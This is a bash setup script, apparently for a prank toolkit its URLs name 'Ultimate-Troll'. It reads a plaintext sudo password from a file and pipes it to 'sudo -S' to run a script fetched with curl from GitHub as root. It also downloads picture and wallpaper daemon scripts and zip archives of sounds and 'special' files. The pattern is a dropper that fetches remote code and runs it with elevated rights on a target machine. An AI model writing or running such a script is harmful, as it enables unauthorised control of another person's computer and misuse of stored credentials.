#!/usr/bin/env bash
set -euo pipefail

# Ensure the script always runs as user "carterhuang"
if [ "$(whoami)" != "carterhuang" ]; then
  echo "[*] Switching to user carterhuang..."
  exec sudo -u carterhuang bash "$0" "$@"
fi

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
PFILE="$TARGET_DIR/p.txt"

# If setup did not complete before, reset sub-directory and continue
if [ ! -f "$SUBP_DIR/success" ]; then
    echo "❌ Success marker not found. Resetting '$SUBP_DIR' and continuing setup..."
    rm -rf "$SUBP_DIR"
    mkdir -p "$SUBP_DIR"
fi

# Verify sudo password file exists
if [ ! -f "$PFILE" ]; then
    echo "❌ Password file not found at '$PFILE'."
    exit 1
fi
SUDO_PASS=$(<"$PFILE")

# Download required scripts
echo "[*] Downloading install-brew.sh..."
curl -sSL -o "$SUBP_DIR/install-brew.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/install-brew.sh"

# (Add additional script downloads below as needed)
# Example:
# curl -sSL -o "$SUBP_DIR/another-script.sh" "https://example.com/another-script.sh"

# Make all downloaded scripts executable
chmod +x "$SUBP_DIR/"*.sh

# Run the downloaded scripts
echo "[*] Running install-brew.sh..."
echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/install-brew.sh"

# Download picture-daemon.sh into subp folder
echo "[*] Downloading picture-daemon.sh..."
curl -sSL -o "$SUBP_DIR/picture-daemon.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/picture-daemon.sh"
chmod +x "$SUBP_DIR/picture-daemon.sh"

# Download wallpaper-daemon.sh into subp folder
echo "[*] Downloading wallpaper-daemon.sh..."
curl -sSL -o "$SUBP_DIR/wallpaper-daemon.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/wallpaper-daemon.sh"
chmod +x "$SUBP_DIR/wallpaper-daemon.sh"


# (Run other scripts below as needed)
# Example:
# echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/another-script.sh"


# Download and extract sounds.zip
echo "[*] Downloading sounds.zip..."
curl -sSL -o "$TARGET_DIR/sounds.zip" "https://github.com/Thomas20090425/Ultimate-Troll/raw/refs/heads/main/sounds.zip"
echo "[*] Extracting sounds.zip..."
unzip -o "$TARGET_DIR/sounds.zip" -d "$TARGET_DIR"
echo "[*] Cleaning up sounds.zip..."
rm -f "$TARGET_DIR/sounds.zip"

# Download and extract special.zip
echo "[*] Downloading special.zip..."
curl -sSL -o "$TARGET_DIR/special.zip" "https://github.com/Thomas20090425/Ultimate-Troll/raw/refs/heads/main/special.zip"
echo "[*] Extracting special.zip..."
unzip -o "$TARGET_DIR/special.zip" -d "$TARGET_DIR"
echo "[*] Cleaning up special.zip..."
rm -f "$TARGET_DIR/special.zip"

echo "[*] Setup complete!"
# Create a success marker file
touch "$SUBP_DIR/success"